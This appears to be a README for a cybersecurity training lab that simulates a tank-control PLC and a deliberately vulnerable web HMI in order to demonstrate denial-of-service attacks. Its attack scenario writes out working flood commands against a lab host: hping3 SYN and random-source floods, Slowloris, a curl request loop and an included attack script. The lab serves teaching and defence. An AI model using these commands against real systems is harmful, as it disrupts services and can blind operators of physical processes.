A realistic PLC-HMI simulation system for cybersecurity training, specifically designed to demonstrate Denial of Service (DoS) attacks on industrial control systems in a safe, contained environment.

## 🎯 Purpose

This project provides a hands-on training platform for:
- Understanding industrial control system architecture
- Learning DoS attack vectors against SCADA/HMI systems
- Practicing network security concepts in OT environments
- Demonstrating the impact of cyber attacks on industrial processes

### Components

- **PLC (plc.py)**: Socket-based programmable logic controller simulator
  - Runs on port 5020
  - Simulates tank level control physics
  - Continues operation even when HMI is down
  
- **HMI (hmi.py)**: Flask-based Human-Machine Interface
  - Runs on port 5000
  - Serves web UI and REST API
  - Polls PLC every 100ms
  - **Attack Target**: Vulnerable to DoS attacks

- **Web UI (templates/index.html)**: Modern industrial SCADA interface
  - Real-time tank level monitoring
  - Pump and valve controls
  - Flow rate indicators
  - High/Low level alarms
  - Animated pipe flow visualization

## 🚀 Quick Start

### Prerequisites

- Python 3.8 or higher
- pip package manager
- Modern web browser

### Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/ics-dos-training-lab.git
cd ics-dos-training-lab
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

### Running the System

1. Start the PLC server (Terminal 1):
```bash
python plc.py
```
Output: `[PLC] Running on port 5020`

2. Start the HMI server (Terminal 2):
```bash
python hmi.py
```
Output: Flask server running on `http://0.0.0.0:5000`

3. Access the HMI:
```
http://localhost:5000
```

## 🎓 Training Scenarios

### Scenario 1: Normal Operation

1. Access the HMI interface
2. Click **START** to activate the pump
3. Observe tank level rising
4. Click **OPEN** to open the drain valve
5. Monitor flow rates and alarm indicators

### Scenario 2: DoS Attack Simulation

**Setup**: Attack machine on the same network as the Windows VM running the HMI.

#### Method 1: Using Included Python Script (Recommended)

```bash
# From any machine with Python
python dos_attack.py <WINDOWS_VM_IP>

# Or from the same machine
python dos_attack.py localhost
```

#### Method 2: Using hping3 (Kali Linux)

```bash
# Install hping3
sudo apt-get install hping3

# Multiple attack vectors
sudo hping3 -S --flood -p 5000 <WINDOWS_VM_IP>  # SYN flood
sudo hping3 --flood --rand-source -p 5000 <WINDOWS_VM_IP>  # Randomized source
```

#### Method 3: Using Slowloris

```bash
# Install slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris

# Launch attack with high socket count
python3 slowloris.py <WINDOWS_VM_IP> -p 5000 -s 200
```

#### Method 4: Using curl (Simple HTTP Flood)

```bash
# Bash loop for HTTP flooding
while true; do curl http://<WINDOWS_VM_IP>:5000/api/data & done
```

#### Expected Results

- ✅ **PLC continues running** on port 5020
- ❌ **HMI becomes unresponsive** (port 5000 flooded)
- ❌ **Web UI freezes or shows connection errors**
- ❌ **Operator loses visibility** into the process
- ⚠️ **Tank continues to operate** based on last commands
- 📊 **Browser console shows failed API requests**

#### Observing the Attack

1. Open browser developer tools (F12)
2. Go to Network tab
3. Start the DoS attack
4. Watch API requests fail with timeouts
5. HMI graphics freeze/lag significantly
6. PLC terminal shows continued operation

This demonstrates the critical importance of:
- Network segmentation
- Rate limiting and connection throttling
- Intrusion detection systems
- Redundant monitoring paths
- Load balancing and failover mechanisms

## 📡 API Reference

### GET /api/data

Retrieve current system state.

**Response:**
```json
{
  "tank_level": 50.0,
  "pump_on": false,
  "valve_open": false,
  "flow_in": 0,
  "flow_out": 0
}
```

### POST /api/control

Send control commands.

**Request:**
```json
{
  "device": "pump",
  "action": "start"
}
```

**Devices**: `pump`, `valve`  
**Actions**: `start`, `stop` (pump) | `open`, `close` (valve)

## 🔧 Configuration

### PLC Physics Parameters

Edit `plc.py` to adjust simulation behavior:

```python
# Fill rate when pump is on
self.tank_level += 2.0  # % per cycle

# Drain rate when valve is open
self.tank_level -= 1.5  # % per cycle

# Evaporation rate
self.tank_level -= 0.1  # % per cycle
```

### HMI Polling Rate

Edit `templates/index.html`:

```javascript
// Poll backend every 100ms
setInterval(fetchState, 100);
```

## 🛡️ Security Considerations

**⚠️ WARNING**: This system is intentionally vulnerable for training purposes.

**Do NOT**:
- Deploy on production networks
- Expose to the internet
- Use in operational environments

**Recommended Setup**:
- Isolated virtual network
- VM-only environment
- No connection to real control systems

## 📚 Learning Objectives

After completing this lab, students will understand:

1. **ICS Architecture**: Separation between PLC logic and HMI visualization
2. **Attack Vectors**: How DoS attacks target operator interfaces
3. **Impact Analysis**: Loss of visibility vs. loss of control
4. **Defense Strategies**: Network segmentation, redundancy, monitoring
5. **Incident Response**: Detecting and mitigating DoS attacks on OT networks
